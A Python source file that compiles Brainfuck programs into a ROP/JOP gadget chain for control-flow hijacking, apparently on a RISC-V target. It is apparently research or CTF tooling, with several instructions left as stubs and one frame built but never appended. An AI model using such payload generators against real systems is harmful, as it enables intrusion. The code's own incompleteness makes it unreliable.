from bf_parser.jop_gadgets.increment_a3 import *
from bf_parser.jop_gadgets.increment_s0 import *
from bf_parser.jop_gadgets.initialize_a2 import *
from bf_parser.jop_gadgets.initialize_a3 import *
from bf_parser.jop_gadgets.initialize_a3_a7 import *
from bf_parser.jop_gadgets.store_s0 import *
from bf_parser.jop_gadgets.load_s0 import *
from bf_parser.jop_gadgets.li_a1_0 import *
from bf_parser.jop_gadgets.mov_s0_a0 import *

from bf_parser.rop_gadgets.copy_a3 import *
from bf_parser.rop_gadgets.restore_a3 import *
from bf_parser.rop_gadgets.mov_a0_s0 import *
from bf_parser.rop_gadgets.and_a3_s0 import *
from bf_parser.rop_gadgets.charger import *

class BF_Parser():
    def __init__(self, bf_code):
        self.__bf_code = bf_code

        # rop gadget objects
        self.__charger    = Charger()
        self.__copy_a3    = CopyA3()
        self.__restore_a3 = RestoreA3()
        self.__mov_a0_s0  = MovA0_S0()
        self.__and_a3_s0  = AndA3_S0()

        # jop gadget objects
        self.__init_a3    = InitializeA3()
        self.__inc_a3     = IncrementA3()
        self.__load_s0    = LoadS0()
        self.__inc_s0     = IncrementS0()
        self.__store_s0   = StoreS0()
        self.__mov_s0_a0  = MovS0_A0()
        self.__li_a1_0    = LiA1_0()

    def get_payload_len(self):
        # return the number of bytes of the generated rop chain

        total_len = 8 + self.__charger.get_frame_size() # for the initialization

        for instruction in self.__bf_code:
            if instruction == '>' or instruction == '<':
                total_len +=  self.__charger.get_frame_size()

            elif instruction == '+' or instruction == '-':
                total_len += 4 *  self.__charger.get_frame_size() + \
                             self.__copy_a3.get_frame_size() + \
                             self.__restore_a3.get_frame_size() + \
                             self.__mov_a0_s0.get_frame_size() + \
                             self.__and_a3_s0.get_frame_size()

            elif instruction == '.':
                pass

            elif instruction == ',':
                pass

            elif instruction == '[':
                pass

            elif instruction == ']':
                pass

        return total_len

    def parse(self, pointer_start, backup_addr):
        # initialize a3 to point to the middle of the tape
        self.__charger.construct_frame(ra=self.__init_a3.get_vaddr(), s4=self.__charger.get_vaddr(), s7=pointer_start)

        rop_chain = self.__charger.print_vaddr() # charger address that overrides $ra
        rop_chain += self.__charger.print_gadget() # charger frame

        for instruction in self.__bf_code:
            if instruction == '>' or instruction == '<':
                increment = 0x8 if instruction == '>' else -0x8

                self.__charger.construct_frame(ra=self.__inc_a3.get_vaddr(), \
                                               s1=increment, \
                                               s4=self.__charger.get_vaddr() \
                                              )
                rop_chain += self.__charger.print_gadget()

            elif instruction == '+' or instruction == '-':
                increment = 1 if instruction == '+' else -1

                self.__construct_charger(ra=self.__copy_a3.get_vaddr(), \
                                         s0=backup_addr, \
                                         s1=-0x60, \
                                         s4=self.__charger.get_vaddr() \
                                        )
                rop_chain += self.__charger.print_gadget()

                self.__construct_copy_a3(ra=self.__inc_a3.get_vaddr())
                rop_chain += self.__copy_a3.print_gadget()

                self.__construct_charger(ra=self.__load_s0.get_vaddr(), \
                                         s1=self.__mov_a0_s0.get_vaddr(), \
                                         s4=self.__inc_s0.get_vaddr(), \
                                         s7=self.__charger.get_vaddr(), \
                                         s11=increment \
                                        )
                rop_chain += self.__charger.print_gadget()

                self.__construct_mov_a0_s0(ra=self.__restore_a3.get_vaddr(), \
                                           s0=backup_addr - 0x40, \
                                           s3=1 \
                                          )
                rop_chain += self.__mov_a0_s0.print_gadget()

                self.__construct_restore_a3(ra=self.__and_a3_s0.get_vaddr(), \
                                            s0=pointer_start, \
                                            s2=1 \
                                            )
                rop_chain += self.__restore_a3.print_gadget()

                self.__construct_and_a3_s0(ra=self.__charger.get_vaddr())
                rop_chain += self.__and_a3_s0.print_gadget()

                self.__construct_charger(ra=self.__mov_s0_a0.get_vaddr(), \
                                         s1=-0x28, \
                                         s2=1, \
                                         s3=1, \
                                         s4=self.__charger.get_vaddr(), \
                                         s7=self.__inc_a3.get_vaddr(), \
                                        )
                rop_chain += self.__charger.print_gadget()

                self.__construct_charger(ra=self.__li_a1_0.get_vaddr(), \
                                         s1=self.__store_s0.get_vaddr(), \
                                         s8=self.__charger.get_vaddr() - 0x6d6
                                        )
                rop_chain += self.__charger.print_gadget()

                self.__construct_charger(ra=self.__inc_a3.get_vaddr(), \
                                         s1=0x28, \
                                         s4=self.__charger.get_vaddr()
                                        )

            elif instruction == '.':
                pass

            elif instruction == ',':
                pass

            elif instruction == '[':
                pass

            elif instruction == ']':
                pass

        return rop_chain